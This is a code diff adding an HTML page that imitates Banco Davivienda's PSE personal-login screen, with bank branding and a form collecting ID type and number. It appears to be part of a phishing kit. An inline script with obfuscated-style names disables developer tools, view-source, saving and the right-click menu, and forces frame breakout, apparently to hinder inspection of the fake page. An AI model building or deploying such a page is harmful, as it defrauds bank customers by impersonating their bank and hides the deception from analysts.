@@ -1,0 +1,26 @@
+<!doctype html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta name="theme-color" content="#E30613"><title>PSE - Davivienda</title><link rel="icon" type="image/png" href="img/logo-davivienda2.png"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet"><link rel="stylesheet" href="login.css"></head><body class="bodyPersonas"><div class="dav-wrapper"><header class="dav-header"><div class="dav-header-logo-wrap"><img src="img/logo-davivienda2.png" alt="Davivienda" class="dav-logo"></div><div class="dav-header-info"><span id="dav-fecha">Sábado, 10 de octubre de 2026, 05:56 p. m.</span><br><span>Código único CUS: <strong id="dav-cus">000000000</strong></span></div></header><section class="dav-section"><div class="dav-contenedorTabla"><h1 align="center" class="dav-h1">Ingreso Persona Natural</h1><h2 align="center" class="dav-h2">Pagos en Línea y PSE</h2><div class="dav-form-card"><p class="dav-form-titulo">Por favor ingrese la siguiente información:</p><form id="davFormLogin" autocomplete="off"><div class="dav-field"><label for="dav-tipo-doc">Tipo de documento</label> <select id="dav-tipo-doc" class="dav-select" required><option value="01" selected="selected">Cedula de Ciudadania</option><option value="02">Cedula de Extranjeria</option><option value="03">NIT</option><option value="04">Tarjeta de Identidad</option><option value="05">Pasaporte</option><option value="06">Trj. Seguro Social Extranjero</option><option value="07">Sociedad Extranjera sin NIT en Colombia</option><option value="08">Fideicomiso</option><option value="09">NIT Menores</option><option value="10">RIF Venezuela</option><option value="11">NIT Extranjeria</option><option value="12">NIT Persona Natural</option><option value="13">Registro Civil De Nacimiento</option><option value="18">Permiso Proteccion Temporal</option></select></div><div class="dav-field"><label for="dav-num-doc">No. de documento</label> <input type="tel" id="dav-num-doc" class="dav-input" inputmode="numeric" pattern="[0-9]*" maxlength="30" required></div><div class="dav-botones"><button type="submit" class="dav-btn-continuar" id="davBtnContinuar">Continuar</button> <button type="button" class="dav-btn-cancelar" id="davBtnCancelar">Cancelar</button></div></form></div></div></section><footer class="dav-footer"><div class="dav-footer-inner"><p class="dav-footer-text">Banco Davivienda S.A. Todos los derechos reservados 2026.</p><div class="dav-footer-logos"><img src="img/Vigilado.png" alt="Vigilado Superintendencia Financiera de Colombia" class="dav-vigilado"></div></div></footer></div><script src="login.js"></script>
+<script>
+(function(){
+'use strict';
+var _0xa1=0;
+document.addEventListener('touchend',function(_0xb2){
+var _0xc3=new Date().getTime();
+if(_0xc3-_0xa1<=300){_0xb2.preventDefault();}
+_0xa1=_0xc3;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xd4){_0xd4.preventDefault();});
+document.addEventListener('contextmenu',function(_0xe5){_0xe5.preventDefault();return false;});
+document.addEventListener('keydown',function(_0xf6){
+var _0xg7=(_0xf6.key||'').toLowerCase();
+var _0xh8=_0xf6.ctrlKey||_0xf6.metaKey;
+var _0xi9=_0xf6.shiftKey;
+if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
+});
+document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
+try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xk1){document.body.innerHTML='';}
+})();
+</script>
+</body></html>
